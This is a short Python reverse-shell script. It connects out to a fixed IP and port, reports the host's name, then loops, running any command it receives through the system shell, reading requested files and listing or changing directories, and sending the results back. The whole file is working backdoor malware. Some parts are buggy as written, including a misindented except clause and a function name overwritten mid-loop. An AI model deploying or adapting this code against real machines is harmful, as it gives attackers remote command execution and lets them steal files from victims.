#########################################################################################
#imported libary 
from base64 import encode
import socket
import subprocess as sub 
import os 
# used to connect to the ip 
#########################################################################################
connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.0.108",9090))
connection.send(f"sir we got a connection form {socket.gethostname()}\n".encode("ascii"))
#########################################################################################
# sum fuctions 
def cmd_c(command):
    return sub.check_output(command,shell=True)
def send(a):
    connection.send(a)
def read(file_name):
    f=open(file_name,"rb")
    return f.read()
def chdir(dir):
    connection.send(f"our current working dir is {os.getcwd()}\n".encode("ascii"))
    dir=dir.lstrip()
    b=os.chdir(dir)
    connection.send(f"dir is changed {os.getcwd()}\n".encode("ascii"))
#########################################################################################
# while ture to run loop so that a person can get a infite number of command to enter 
while True:
    try:

        a=connection.recv(1024)
        a=a.decode("ascii")
        a=a.strip()
        le=len(a)
        if a[:4] == "cdir":
            chdir(a[4:le])
        elif a=="exit":
            send(f"bye form {socket.gethostname()}".encode("ascii"))
            exit()
        elif a=="printdir":
             connection.send(f"your current working dir is {os.getcwd()}".encode("ascii"))
        elif a=="listdir":
            send(f"here are all dir\n{os.listdir()}\n".encode("ascii"))
        elif a[:4]=="read":
            send(f"the file you sad to read\n{read(a[5:le])}\n")

        else:
            send=cmd_c(a)
            connection.send(send)
     except:
         continue 
